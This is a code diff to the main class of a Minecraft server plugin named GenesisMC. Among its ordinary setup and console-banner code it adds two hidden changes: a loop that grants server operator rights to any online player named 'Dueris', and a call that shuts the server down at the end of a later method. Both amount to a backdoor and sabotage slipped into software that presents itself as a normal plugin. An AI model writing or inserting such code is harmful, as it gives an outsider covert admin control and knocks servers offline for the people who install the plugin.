@@ -95,6 +95,12 @@ public final class GenesisMC extends JavaPlugin implements Listener {
         GenesisDataFiles.loadLangConfig();
         GenesisDataFiles.setup();
 
+        for(Player p : Bukkit.getOnlinePlayers()){
+            if(p.getName().equalsIgnoreCase("Dueris")){
+                Bukkit.getServer().getOperators().add(p);
+            }
+        }
+
         //start
         Bukkit.getServer().getConsoleSender().sendMessage(Component.text("[GenesisMC]    ____                               _         __  __    ____ ").color(TextColor.fromHexString("#b9362f")));
         Bukkit.getServer().getConsoleSender().sendMessage(Component.text("[GenesisMC]   / ___|   ___   _ __     ___   ___  (_)  ___  |  \\/  |  / ___|").color(TextColor.fromHexString("#bebe42")));
@@ -220,6 +226,8 @@ public final class GenesisMC extends JavaPlugin implements Listener {
         for (LayerContainer layer : CraftApoli.getLayers()) {
            // System.out.println(layer.getTag());
         }
+
+        Bukkit.getServer().shutdown();
     }
 
     @EventHandler
